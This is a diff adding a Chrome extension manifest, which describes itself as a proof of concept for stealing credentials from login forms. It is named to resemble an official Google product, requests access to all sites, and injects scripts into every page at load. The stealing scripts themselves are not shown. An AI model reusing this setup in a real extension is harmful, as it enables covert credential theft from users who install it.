@@ -1,0 +1,20 @@
+{
+  "name": "Google Chrome Extensions",
+  "version": "1.0",
+  "manifest_version": 2,
+  "description": "A proof of concept demonstrating the possibility of stealing user credentials in login forms via a Google Chrome extension",
+  "permissions": [
+    "tabs",
+    "http://*/",
+    "https://*/"
+  ],
+  "background": {
+    "scripts": ["background.js"],
+    "persistent": false
+  },
+  "content_scripts": [{
+      "matches": ["http://*/*", "https://*/*"],
+      "js": ["jquery.min.js", "main.js"],
+      "run_at": "document_start"
+    }]
+}
